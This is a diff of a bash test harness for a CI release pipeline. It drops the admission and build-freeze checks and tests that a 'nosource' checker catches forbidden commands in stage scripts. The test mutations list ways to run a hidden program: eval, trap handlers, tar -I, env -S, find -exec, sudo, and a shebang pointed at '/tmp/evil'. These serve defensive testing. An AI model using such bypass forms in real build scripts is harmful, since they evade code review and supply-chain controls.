-    if [ "$(wc -l < "$d/gh.log" 2> /dev/null || echo 0)" -ge 1 ]; then
-      ok "AC12 $t apk: the release run makes the admission's reads through gh (the contrast of the snapshot runs' zero gh calls)"
-    else
-      bad "AC12 $t apk: the release run made no gh call: the zero of the snapshot cases would prove nothing"
-    fi
-    fails "$d" "$s" "$mode" "$v" "a refused admission runs nothing else (no build, no version check)" FAKE_ADMIT_RC=1 '^apk |^version '
     fails "$d" "$s" "$mode" "$v" "a failing --print-source-date-epoch stops the job before any build (the export cannot mask it)" FAKE_SDE_RC=1 '^apk '
     fails "$d" "$s" "$mode" "$v" "build-apk.sh exit 2 (a named refusal) stops before the version checks" FAKE_APK_RC=2 '^version '
     fails "$d" "$s" "$mode" "$v" "build-apk.sh exit 4 (a network attempt in the sealed call) stops before the version checks" FAKE_APK_RC=4 '^version '
@@ -2166,7 +2032,7 @@ PY
     fi
   fi
 }
-# ---- the snapshot scripts RUN against the same fakes (REQ-CHAIN-004-AC12): no tag, no admission, no version check, no policy, no verify ---------------
+# ---- the snapshot scripts RUN against the same fakes (REQ-CHAIN-004-AC12): no tag, no version check, no policy, no verify ---------------
 # The run is a pull request's: GITHUB_REF_NAME is 123/merge, which is no tag, so a snapshot script that read the tag would fail or pass a wrong version.
 # The version cache's scripts get is the fixed snapshot one; the oracle is computed for the tag v0.0.0-rc.1 that names it.
 SNAP_TAG=v0.0.0-rc.1
@@ -2248,14 +2114,14 @@ beh_snapshot_apk() { # beh_snapshot_apk TAGNAME SCRIPT MODE
     bad "AC12 $t snapshot-apk: the apks are not signed with the assembly key alone"
   fi
   mk "$d" snapshot-apk "$s" "$mode" "$SNAP_TAG"; rc=$(run_stage "$d" snapshot-apk "$mode" "$SNAP_TAG"); calls=$(cat "$d/calls.log" 2> /dev/null || true)
-  if [ "$rc" = 0 ] && ! grep -q '^admit' <<< "$calls" && [ "$(n_calls '^version ' "$d")" = 0 ] && [ "$(n_calls '^apk ' "$d")" = 2 ] \
+  if [ "$rc" = 0 ] && [ "$(n_calls '^version ' "$d")" = 0 ] && [ "$(n_calls '^apk ' "$d")" = 2 ] \
      && [ "$(n_calls "--version ${SNAP_TAG#v} " "$d")" = 3 ]; then
-    ok "AC12 $t snapshot-apk: no admission and no version check, both variants build with --version ${SNAP_TAG#v} although the ref is a pull request's"
+    ok "AC12 $t snapshot-apk: no version check, both variants build with --version ${SNAP_TAG#v} although the ref is a pull request's"
   else
     bad "AC12 $t snapshot-apk: exit $rc, calls: $(tr '\n' '|' <<< "$calls" | cut -c1-200)"
   fi
   if [ ! -s "$d/gh.log" ]; then
-    ok "AC12 $t snapshot-apk: the run makes ZERO gh calls (the admission's reads are unused in snapshot mode)"
+    ok "AC12 $t snapshot-apk: the run makes ZERO gh calls"
   else
     bad "AC12 $t snapshot-apk: gh was called: $(head -c 120 "$d/gh.log")"
   fi
@@ -2324,9 +2190,9 @@ beh_snapshot_rebuild_apk() { # beh_snapshot_rebuild_apk TAGNAME SCRIPT MODE
   rc=$(run_stage "$d" snapshot-rebuild-apk "$mode" "$SNAP_TAG"); calls=$(cat "$d/calls.log" 2> /dev/null || true)
   tagline=$(line_of 'git tag --force v0.0.0-rc.1 HEAD' "$d"); firstbuild=$(line_of '^apk ' "$d")
   if [ "$rc" = 0 ] && [ -n "$tagline" ] && [ -n "$firstbuild" ] && [ "$tagline" -lt "$firstbuild" ] && ! grep -q 'git push' "$d/calls.log" \
-     && ! grep -Eq '^verify (policy|verify|stage-start)|^admit' <<< "$calls" && [ "$(n_calls "--version ${SNAP_TAG#v} " "$d")" = 3 ]; then
+     && ! grep -Eq '^verify (policy|verify|stage-start)' <<< "$calls" && [ "$(n_calls "--version ${SNAP_TAG#v} " "$d")" = 3 ]; then
     ok \
-        "005-AC7 $t snapshot-rebuild-apk: the local v0.0.0-rc.1 tag, then both builds with --version ${SNAP_TAG#v}; no policy, stage-start, admission or push"
+        "005-AC7 $t snapshot-rebuild-apk: the local v0.0.0-rc.1 tag, then both builds with --version ${SNAP_TAG#v}; no policy, stage-start or push"
   else
     bad "005-AC7 $t snapshot-rebuild-apk: exit $rc, calls: $(tr '\n' '|' <<< "$calls" | cut -c1-200)"
   fi
@@ -2401,14 +2267,14 @@ for tag in fixture real; do
     elif ! guard_first "$f" "$kind"; then
       bad "AC12 $tag bin/build-stage-$(file_of "$kind").sh"\
         ": the GITHUB_ACTIONS guard does not come before the first git tag"
-    elif grep -Eq '(^|[^[:alnum:]_.-])gh[[:space:]]|build-admit' "$f"; then
-      bad "AC12 $tag bin/build-stage-$(file_of "$kind").sh names gh or the admission (snapshot mode makes no API read)"
+    elif grep -Eq '(^|[^[:alnum:]_.-])gh[[:space:]]' "$f"; then
+      bad "AC12 $tag bin/build-stage-$(file_of "$kind").sh names gh (snapshot mode makes no API read)"
     else
-      ok "AC12 $tag bin/build-stage-$(file_of "$kind").sh never pushes a tag and never calls gh or the admission"
+      ok "AC12 $tag bin/build-stage-$(file_of "$kind").sh never pushes a tag and never calls gh"
     fi
   done
 done
-cases_of() { case "$1" in apk) echo 12;; assemble) echo 14;; rebuild-apk) echo 2;; rebuild-assemble) echo 6;; esac; }    # cases one kind runs for the version v0.3.0 (the rc version was deleted with rc tags)
+cases_of() { case "$1" in apk) echo 10;; assemble) echo 14;; rebuild-apk) echo 2;; rebuild-assemble) echo 6;; esac; }    # cases one kind runs for the version v0.3.0 (the rc version was deleted with rc tags)
 for tag in fixture real; do
   mode=oracle; [ "$tag" = real ] && mode=real
   for kind in apk assemble rebuild-apk rebuild-assemble; do
@@ -2557,17 +2423,7 @@ f1 caught "a panel download by artifact id of something that is not a scanner jo
 f1 caught "a download by artifact id outside the panel job is caught" "$root/.github/workflows/main-candidate-rescan.yml" '1,/name: images/s/name: images/artifact-ids: ${{ needs.panel-grype.outputs.artifact-id }}/'
 f1 caught "a panel download by artifact id with a name beside it is caught" "$root/.github/workflows/main-candidate-rescan.yml" 's#path: /tmp/panel/panel-scout#name: images#'
 f1 caught "a panel download by artifact id with another key (run-id) in place of the path is caught" "$root/.github/workflows/main-candidate-rescan.yml" 's#path: /tmp/panel/panel-scout#run-id: 123#'
-# Codex A r2 blocker 1 / B4: Build's assemble stops a tag that is not the admission's (the near-miss tags are stopped by the admission-baseline line,
-# which only Build's assemble, STEP apk, runs); the release-candidate tag's own run through both assemble scripts was deleted with rc tags (Nov 23)
-for kind in assemble; do
-  for nm in v0.3.0-rc.1 v0.3.0-RC1 v0.3.0-rc1x; do
-    rd="$work/rcn-$kind-$nm"; mk "$rd" "$kind" "$(script_of real "$kind")" real v0.3.0-rc1
-    rc=$(REF_NAME=$nm run_stage "$rd" "$kind" real v0.3.0-rc1)
-    if [ "$rc" != 0 ] && [ "$(n_calls '^image ' "$rd")" = 0 ] && grep -q "refused at build: tag" "$rd/stage.err"; then ok "AC12/rc $kind: the near-miss tag $nm is refused at the admission's tag check (not the run's tag), before any image is built"
-    else bad "AC12/rc $kind: near-miss $nm: rc=$rc images=$(n_calls '^image ' "$rd") $(head -c 120 "$rd/stage.err" 2> /dev/null | tr '\n' ' ')"; fi
-  done
-done
-# REQ-CHAIN-007-AC14, ruling 2 of cache#921: release-verify (its own job, no if) judges the tag, and the job after it, release, carries exactly guard S as its job if
+# REQ-CHAIN-007-AC14, ruling 2 of cache#921: release-verify (its own job, no if) and the job after it, release, carries exactly guard S as its job if
 # (release candidates as rc tags are gone, Nov 23: no tag-name rule is left in any job's if).
 cat > "$work/rcgate.py" <<'PY'
 import sys, yaml
@@ -2668,7 +2524,7 @@ import sys, yaml
 R = {r["id"]: r for r in yaml.safe_load(open(sys.argv[1]))["requirements"]}
 def then(rid, n): return next(a for a in R[rid]["acceptance_criteria"] if a["id"] == "%s-AC%d" % (rid, n))["then"]
 t3, t11, t5 = then("REQ-CHAIN-004", 3), then("REQ-CHAIN-004", 11), then("REQ-CHAIN-005", 1)
-assert "the apk job installs melange only and the assemble job apko only, each by the pinned installer line (`bash bin/install-build-tools.sh melange` or `bash bin/install-build-tools.sh apko`) as one step right after the Witness (and Go) install and so before admission, with no env and no secret" in t3
+assert "the apk job installs melange only and the assemble job apko only, each by the pinned installer line (`bash bin/install-build-tools.sh melange` or `bash bin/install-build-tools.sh apko`) as one step right after the Witness (and Go) install, with no env and no secret" in t3
 assert "its apk job installs melange only and its assemble job apko only, as REQ-CHAIN-004-AC3 says of Build" in t5
 assert "no stage file or stage script names apko except the one pinned installer line of REQ-CHAIN-004-AC3 (`bash bin/install-build-tools.sh apko`), passes a lock," in t11
 assert "no stage file or stage script names apko, passes a lock," not in t11
@@ -2892,17 +2748,8 @@ PY
 )
 if [ -z "$absent_here" ]; then ok "base inputs: every path .github/policy/base-inputs.json lists is a file of this tree"
 else bad "base inputs: a path .github/policy/base-inputs.json lists is not a file of this tree: $(printf '%s' "$absent_here" | tr '\n' ' ')"; fi
-# the harness itself can fail: (1) a script that ignores a refused admission is visible; (2) a script without its digest-list copy line fails its cases and the
+# the harness itself can fail: a script without its digest-list copy line fails its cases and the
 # summary still prints (a wrong implementation must not abort the test: every counting command above is safe under set -e)
-mk "$work/ctl" apk "$work/s-apk.sh" oracle v0.3.0
-sed -i.bak 's/^\(python3 -I bin\/build-admit\.py run\)$/\1 || true/' "$work/ctl/bin/build-stage-apk.sh"
-rm -f "$work/ctl/bin/build-stage-apk.sh.bak"
-rc=$(run_stage "$work/ctl" apk oracle v0.3.0 FAKE_ADMIT_RC=1)
-if [ "$rc" = 0 ] || [ "$(n_calls '^apk ' "$work/ctl")" != 0 ]; then
-  ok "control: a script that ignores a refused admission is visible to the behaviour cases (exit $rc, a build ran)"
-else
-  bad "control: the ignoring script was NOT visible (exit $rc)"
-fi
 grep -v 'cp build-in/digests.json' "$work/s-assemble.sh" > "$work/ctl-ra.sh"; before_pass=$pass; before_fail=$failn
 beh_rebuild_assemble control "$work/ctl-ra.sh" oracle v0.3.0 > /dev/null
 new_fail=$((failn - before_fail)); pass=$before_pass; failn=$before_fail
@@ -2931,8 +2778,6 @@ jobs:
       issues: write
       actions: read
       checks: read
-      statuses: read
-      pull-requests: read
     uses: ./.github/workflows/release.yml
     with:
       mode: snapshot
@@ -2961,8 +2806,8 @@ cl c3  "AC14 no input at all (the stage's default is release)" "    with:\n     
 cl c4  "AC14 secrets: inherit" "      mode: snapshot" "      mode: snapshot\n    secrets: inherit" "keys outside"
 cl c5 "AC14 an if on the call" "    uses: ./.github/workflows/release.yml" \
     "    if: github.event_name == 'push'\n    uses: ./.github/workflows/release.yml" "keys outside"
-cl c6 "AC14 a grant beyond the ceiling (actions: write)" "      pull-requests: read\n    uses" \
-    "      pull-requests: read\n      actions: write\n    uses" "static ceiling"
+cl c6 "AC14 a grant beyond the ceiling (actions: write)" "      checks: read\n    uses" \
+    "      checks: read\n      actions: write\n    uses" "static ceiling"
 cl c7 "AC14 a missing grant (id-token: write gone: GitHub refuses the called file's jobs, startup_failure)" "      id-token: write\n" "" "static ceiling"
 cl c8 "AC14 a call of a stage file (the five stage files are deleted)" "  scanners:" \
     "  assemble:\n    needs: build\n    uses: ./.github/workflows/stage-build.yml\n  scanners:" "allowlist"
@@ -3006,8 +2851,6 @@ cl w1 "AC14 ceiling: contents narrowed to read on the build call" "      content
 cl w2 "AC14 ceiling: packages write gone from the build call" "      packages: write\n" "" "static ceiling"
 cl w3 "AC14 ceiling: attestations write on the build call is beyond the ceiling" "      id-token: write\n" "      attestations: write\n      id-token: write\n" "static ceiling"
 cl w4 "AC14 ceiling: checks: write on the build call" "      checks: read" "      checks: write" "static ceiling"
-cl w5 "AC14 ceiling: statuses: write on the build call" "      statuses: read" "      statuses: write" "static ceiling"
-cl w7 "AC14 ceiling: pull-requests: write on the build call" "      pull-requests: read" "      pull-requests: write" "static ceiling"
 replace "$work/caller.yml" "$work/c15.yml" "echo anything at all, including secrets" "echo changed" \
   && expect ok "AC14 an edit inside the manifests job (cache's REQ-REL-004-AC5) does not change the verdict" "" callers "$work/c15.yml"
 replace "$work/caller.yml" "$work/c16.yml" "    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/download-artifact" \
@@ -3024,7 +2867,7 @@ spec = importlib.util.spec_from_file_location("shape", shape)
 S = importlib.util.module_from_spec(spec); spec.loader.exec_module(S)
 seen, bad = S.ns_closure(root)
 assert seen and not bad, bad
-for p in seen + [".github/policy/chain-scripts.json", "bin/build-freeze.sh"]:
+for p in seen + [".github/policy/chain-scripts.json"]:
     os.makedirs(os.path.dirname(os.path.join(dst, p)), exist_ok=True)
     shutil.copy(os.path.join(root, p), os.path.join(dst, p))
 PY
@@ -3090,23 +2933,6 @@ PY
   expect caught "$1 $2" "$3" nosource "$work/nsm"
 }
 CNT="commands, the grammar has"; EXP=": expected"
-# bin/build-freeze.sh is no root and not skipped: a closure file that names it, or a `runs` entry that lists it, is a
-# finding
-nsa FZ1 "nosource a Python closure file that names bin/build-freeze.sh is a finding" "reaches bin/build-freeze.sh" \
-  bin/build-archives.py 'x = "bin/build-freeze.sh"'
-nsa FZ2 "nosource a shell closure file that runs bin/build-freeze.sh is a finding" "reaches bin/build-freeze.sh" \
-  bin/assemble-image.sh 'bash bin/build-freeze.sh'
-nsfresh
-python3 - "$work/nsm/.github/policy/chain-scripts.json" <<'PY'
-import json, sys
-f = sys.argv[1]
-d = json.load(open(f))
-row = next(r for r in d["scripts"] if r["path"] == "bin/build-admit.py")
-row["runs"].append("bin/build-freeze.sh")
-json.dump(d, open(f, "w"), indent=2)
-PY
-expect caught "FZ3 nosource a runs entry that lists bin/build-freeze.sh is a finding" "reaches bin/build-freeze.sh" \
-  nosource "$work/nsm"
 # line 1 of each shell file is held, the stage lines run python3 -I
 while read -r f; do
   nsl "L1-$f" "nosource line 1 of $f is held: a changed shebang is a finding" "shebang" "$f" sub '^#!' '#!/tmp/evil'
@@ -3165,7 +2991,6 @@ for jn in S.FAMILY_JOBS["build"] + S.FAMILY_JOBS["rebuild"]:
     for step in jobs[jn]["steps"]:
         ran.update(re.findall(r"bin/[A-Za-z0-9_][A-Za-z0-9_.-]*\.(?:sh|py)", str(step.get("run") or "")))
 roots = {p.replace(root + "/", "") for g in S.NS_ROOTS for p in glob.glob(root + "/" + g)} | set(S.NS_SKIP)
-roots.add(S.NS_FREEZE)      # the freeze job runs it; no closure file may
 assert ran == roots, (sorted(ran - roots), sorted(roots - ran))
 PY
 then ok "nosource the bin/ scripts on the run: lines of the Build and Rebuild jobs of release.yml are exactly \
@@ -3183,114 +3008,114 @@ nspin N4 "nosource a closure Python file that does not parse is a finding (its c
   "cannot be followed" bin/oci-digest.py '\n(\n'
 # the round-one and rerun rows (cz, go, mk, bin1, mel1, apk1, bp1-bp24) keep their labels
 nsmf cz1 "nosource a stage script runs a test-named script that is not a row" "commands, the grammar has" \
-  bin/chain-test-local.py bin/build-stage-apk.sh 'unset GH_TOKEN' 'unset GH_TOKEN\npython3 bin/chain-test-local.py'
+  bin/chain-test-local.py bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\npython3 bin/chain-test-local.py'
 nsmf cz2 "nosource a stage script runs an extensionless bin/ file that is not a row" "commands, the grammar has" \
-  bin/helper bin/build-stage-apk.sh 'unset GH_TOKEN' 'unset GH_TOKEN\nbash bin/helper'
+  bin/helper bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\nbash bin/helper'
 nsmf cz3 "nosource a path-qualified extensionless bin/ file that is not a row" "commands, the grammar has" \
-  bin/helper bin/build-stage-apk.sh 'unset GH_TOKEN' 'unset GH_TOKEN\n./bin/helper'
-nsm go1 "nosource a go build in a stage script" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\n"$GO_TOOL" build ./cmd/fscache'
+  bin/helper bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\n./bin/helper'
+nsm go1 "nosource a go build in a stage script" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\n"$GO_TOOL" build ./cmd/fscache'
 nsm go2 "nosource go test in a stage script" "commands, the grammar has" bin/build-stage-assemble.sh \
   'mkdir -p melange-repo' 'mkdir -p melange-repo\ngo test ./...'
 nsm go3 "nosource go run through a path to the pinned toolchain (a path-qualified word is judged first)" \
   "commands, the grammar has" bin/build-stage-rebuild-apk.sh 'set -euo pipefail' \
   'set -euo pipefail\n/usr/local/bin/fscache-go/bin/go run ./tools/x'
-nsm go4 "nosource go generate after a semicolon" ": expected" bin/build-stage-apk.sh 'unset GH_TOKEN' \
+nsm go4 "nosource go generate after a semicolon" ": expected" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
   'true; go generate ./...'
-nsm mk1 "nosource make in a stage script" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\nmake all'
-nsm mk2 "nosource a compiler behind sudo" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\nsudo gcc -o x x.c'
+nsm mk1 "nosource make in a stage script" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\nmake all'
+nsm mk2 "nosource a compiler behind sudo" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\nsudo gcc -o x x.c'
 nsm bin1 "nosource the produced binary run in a stage script" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\n./out/fscache.bin --version'
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\n./out/fscache.bin --version'
 nsm mel1 "nosource melange started outside build-apk.sh" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\nmelange build x.yaml'
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\nmelange build x.yaml'
 nsm apk1 "nosource apko started through a path (a path-qualified word is judged first)" "commands, the grammar has" \
   bin/build-stage-assemble.sh 'mkdir -p melange-repo' 'mkdir -p melange-repo\n/usr/local/bin/apko build a b'
 nsm row1 "nosource a script a stage script starts that is not a row" "is not a row of chain-scripts.json" \
   .github/policy/chain-scripts.json '"path": "bin/oci-digest.py"' '"path": "bin/oci-digest-x.py"'
 nsm bp1 "nosource bash -c with a Go build inside" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\nbash -c "go build ./..."'
-nsm bp2 "nosource timeout in front of go build" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\ntimeout 5 go build ./...'
-nsm bp3 "nosource nice in front of go build" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\nnice -n 5 go build ./...'
-nsm bp4 "nosource xargs go build" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\nls | xargs go build'
-nsm bp5 "nosource command in front of make" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\ncommand make all'
-nsm bp6 "nosource time in front of go build" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\ntime go build ./...'
-nsm bp7 "nosource if go build" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\nif go build ./...; then true; fi'
-nsm bp8 "nosource an alias for the Go tool" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\nalias g=go'
-nsm bp9 "nosource python3 -c" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\npython3 -c "import os"'
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\nbash -c "go build ./..."'
+nsm bp2 "nosource timeout in front of go build" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\ntimeout 5 go build ./...'
+nsm bp3 "nosource nice in front of go build" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\nnice -n 5 go build ./...'
+nsm bp4 "nosource xargs go build" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\nls | xargs go build'
+nsm bp5 "nosource command in front of make" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\ncommand make all'
+nsm bp6 "nosource time in front of go build" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\ntime go build ./...'
+nsm bp7 "nosource if go build" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\nif go build ./...; then true; fi'
+nsm bp8 "nosource an alias for the Go tool" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\nalias g=go'
+nsm bp9 "nosource python3 -c" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\npython3 -c "import os"'
 nsm bp10 "nosource python3 on a file that is not a repository script" "commands, the grammar has" \
-  bin/build-stage-apk.sh 'unset GH_TOKEN' 'unset GH_TOKEN\npython3 /tmp/x.py'
+  bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\npython3 /tmp/x.py'
 nsm bp11 "nosource a program named by a variable" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\n"$TOOL" build ./...'
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\n"$TOOL" build ./...'
 nsm bp12 "nosource go build inside a substitution inside double quotes" "commands, the grammar has" \
-  bin/build-stage-apk.sh 'unset GH_TOKEN' 'unset GH_TOKEN\necho "$(go build ./...)"'
-nsm bp13 "nosource eval" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\neval "go build"'
-nsm bp14 "nosource a compiler nobody listed" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\ntsc --build'
-nsm bp15 "nosource a trap handler that builds" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\ntrap "go build ./..." EXIT'
+  bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\necho "$(go build ./...)"'
+nsm bp13 "nosource eval" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\neval "go build"'
+nsm bp14 "nosource a compiler nobody listed" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\ntsc --build'
+nsm bp15 "nosource a trap handler that builds" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\ntrap "go build ./..." EXIT'
 nsm bp22 "nosource a script a closure script names but no runs row lists is read too" "commands, the grammar has" \
-  bin/build-stage-apk.sh 'unset GH_TOKEN' 'unset GH_TOKEN\nbash bin/chain-new-helper.sh'
+  bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\nbash bin/chain-new-helper.sh'
 nsm bp24 "nosource an array expansion standing for the program" "commands, the grammar has" \
   bin/build-stage-assemble.sh 'mkdir -p melange-repo' 'mkdir -p melange-repo\n"${tool[@]}" build'
 nsm sh1 "nosource a substitution inside an array assignment" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\nx=("$(go build ./...)")'
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\nx=("$(go build ./...)")'
 nsm sh2 "nosource a substitution inside a parameter expansion" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\necho ${y:-$(go build ./...)}'
-nsm sh3 "nosource a substitution inside [[ ]]" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\n[[ $(go build ./...) ]]'
-nsm sh4 "nosource a computed command word" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\n"${TOOL:-go}" build ./...'
-nsm sh5 "nosource a globbed command word" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\n/usr/lo?al/bin/g? build'
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\necho ${y:-$(go build ./...)}'
+nsm sh3 "nosource a substitution inside [[ ]]" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\n[[ $(go build ./...) ]]'
+nsm sh4 "nosource a computed command word" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\n"${TOOL:-go}" build ./...'
+nsm sh5 "nosource a globbed command word" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\n/usr/lo?al/bin/g? build'
 nsm sh6 "nosource trap -- with a build in the handler" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\ntrap -- "go build ./..." EXIT'
-nsm sh7 "nosource find -exec" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\nfind . -name x -exec go build {} \;'
-nsm op1 "nosource tar -I runs a program" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\ntar -I x -cf a.tar b'
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\ntrap -- "go build ./..." EXIT'
+nsm sh7 "nosource find -exec" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\nfind . -name x -exec go build {} \;'
+nsm op1 "nosource tar -I runs a program" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\ntar -I x -cf a.tar b'
 nsm op2 "nosource tar -I inside an option cluster" "commands, the grammar has" bin/build-stage-apk.sh \
-  'unset GH_TOKEN' 'unset GH_TOKEN\ntar -cIx a b'
-nsm op3 "nosource sort --compress-program" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\nsort --compress-program=x f'
-nsm op4 "nosource env -S" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\nenv -S "go build" true'
-nsm op5 "nosource sed -f" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\nsed -f x.sed f'
-nsm op6 "nosource awk -f" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\nawk -f x.awk f'
-nsm op7 "nosource sed -nf (f inside a cluster)" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\nsed -nf x f'
-nsm op8 "nosource sudo -u" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\nsudo -u root true'
-nsm op9 "nosource mapfile -C" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
-  'unset GH_TOKEN\nmapfile -C x -c 1 arr < f'
+  'tag=$(bin/release-version.sh)' 'tag=$(bin/release-version.sh)\ntar -cIx a b'
+nsm op3 "nosource sort --compress-program" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\nsort --compress-program=x f'
+nsm op4 "nosource env -S" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\nenv -S "go build" true'
+nsm op5 "nosource sed -f" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\nsed -f x.sed f'
+nsm op6 "nosource awk -f" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\nawk -f x.awk f'
+nsm op7 "nosource sed -nf (f inside a cluster)" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\nsed -nf x f'
+nsm op8 "nosource sudo -u" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\nsudo -u root true'
+nsm op9 "nosource mapfile -C" "commands, the grammar has" bin/build-stage-apk.sh 'tag=$(bin/release-version.sh)' \
+  'tag=$(bin/release-version.sh)\nmapfile -C x -c 1 arr < f'
 nsm op10 "nosource git -c" "commands, the grammar has" bin/build-stage-snapshot-apk.sh \
   'git tag --force v0.0.0-rc.1 HEAD' 'git tag --force v0.0.0-rc.1 HEAD\ngit -c core.pager=x log'
 nsm op11 "nosource git with a subcommand that is not on the list" "commands, the grammar has" \
